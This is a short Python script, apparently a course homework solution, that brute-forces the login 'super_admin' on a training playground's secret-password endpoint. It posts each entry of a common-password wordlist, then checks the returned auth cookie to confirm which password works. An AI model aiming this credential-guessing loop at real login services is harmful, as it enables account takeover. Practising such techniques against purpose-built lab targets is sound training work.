import requests

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
auth_check_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = "super_admin"

passwords = ["password","123456","123456789","12345678","12345","qwerty","abc123","111111",
"123123","1234567890","1234567","qwerty123","football","monkey","sunshine","iloveyou",
"trustno1","letmein","1234","dragon","baseball","sunshine","welcome","login",
"admin","princess","1qaz2wsx","qwertyuiop","ashley","mustang","121212","starwars",
"bailey","access","flower","555555","passw0rd","shadow","lovely","hello",
"charlie","888888","superman","michael","696969","hottie","freedom","ninja",
"azerty","whatever","donald","password1","Football","000000","qwerty123","123qwe"]

for password in passwords:
    response_login = requests.post(url, data={"login": login, "password": password})
    if "auth_cookie" in response_login.cookies:
        auth_cookie = response_login.cookies["auth_cookie"]
        response_check = requests.post(auth_check_url, cookies={"auth_cookie": auth_cookie})
        if response_check.text == "You are authorized":
            print(f"Верный пароль найден: {password}")
            break
    else:
        print(f"Неверный пароль: {password}")







